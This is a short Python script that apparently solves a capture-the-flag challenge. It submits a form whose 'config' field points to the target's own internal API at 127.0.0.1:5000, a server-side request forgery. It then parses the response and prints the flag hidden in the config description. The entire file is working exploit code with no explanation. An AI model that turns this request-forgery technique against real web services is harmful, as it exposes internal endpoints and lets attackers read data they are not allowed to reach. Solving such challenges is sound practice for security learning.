import requests, argparse, uuid, json
from bs4 import BeautifulSoup

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("base_url")
	parser.add_argument("id")
	args = parser.parse_args()

	exploit_id = str(uuid.uuid4())

	response = requests.post(args.base_url, data={
		"id": exploit_id,
		"code": f"print('YEET')",
		"config": f"http://127.0.0.1:5000/api/{args.id}",
	}).text

	soup = BeautifulSoup(response, 'html.parser')
	config = json.loads(soup.find(id="f_config").get_text())
	print("Flag:", config.get("description"))
